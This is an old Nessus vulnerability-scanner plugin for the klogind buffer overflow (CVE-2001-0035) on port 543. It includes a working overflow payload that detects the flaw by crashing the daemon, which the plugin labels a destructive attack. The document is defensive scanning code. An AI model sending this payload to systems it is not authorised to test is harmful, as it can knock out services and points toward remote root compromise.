#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10411);
 script_cve_id("CVE-2001-0035");
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "klogind overflow";
 name["francais"] = "Divers dépassement de buffers dans klogind";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote klogind seems to be vulnerable to a buffer
overflow which may also affect other kerberos related
programs.

An attacker may use this to gain a root shell
on this host


Solution : See Cert Advisory CA-2000-06
Risk factor : High";


 desc["francais"] = "
Le serveur klogind distant semble etre vulnérable
à un dépassement de buffer qui peut aussi affecter
d'autre programmes kerberos

Un pirate peut utiliser ce problème pour obtenir un
shell root sur cette machine

Solution : Cf Cert Advisory CA-2000-06
Facteur de risque : Elevé";
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to overflow klogind";
 summary["francais"] = "Essaye de trop remplir klogind";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports(543);
 exit(0);
}



port = 543;
if(get_port_state(port))
{
  r = raw_string(0) + 
  	 "AUTHV0.1" + 
      raw_string(0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		   0x00, 0x00, 0x04, 0xB0, 0x04, 0x08, 0x01)
		    +
	crap(1226);
	

#
# Check for a tcpwrapped klogind
#
r1 = raw_string(0) +  "AUTHV0.1" + raw_string(0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		   0x00, 0x00, 0x04, 0xB0, 0x04, 0x08, 0x01);
	
soc = open_priv_sock_tcp(dport:port);	
if(!soc)exit(0);

send(socket:soc, data:r1);
rcv = recv(socket:soc, length:1024, min:1);

	   
if(rcv)
{
 soc = open_priv_sock_tcp(dport:port);	
 send(socket:soc, data:r);
 r = recv(socket:soc, length:1024, min:1);
 if(!r)
  {
  security_hole(port);
  }
 }
}
